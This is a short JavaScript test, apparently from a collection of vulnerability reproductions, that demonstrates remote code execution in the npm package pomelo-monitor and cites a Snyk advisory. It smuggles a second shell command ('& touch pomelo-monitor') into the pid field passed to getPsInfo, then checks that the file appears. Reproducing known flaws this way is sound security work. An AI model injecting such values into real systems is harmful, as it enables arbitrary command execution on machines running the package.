//https://security.snyk.io/vuln/SNYK-JS-POMELOMONITOR-173695
test("Remote code execution in pomelo-monitor", () => {
  const root = require("pomelo-monitor");
  const fs = require("fs");
  const path = "./pomelo-monitor";
  const sleep = require("sleep");

  let param = {
    pid: "& touch pomelo-monitor ",
  };

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    root.psmonitor.getPsInfo(param, function () {});
  } catch (error) {}

  sleep.sleep(3);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
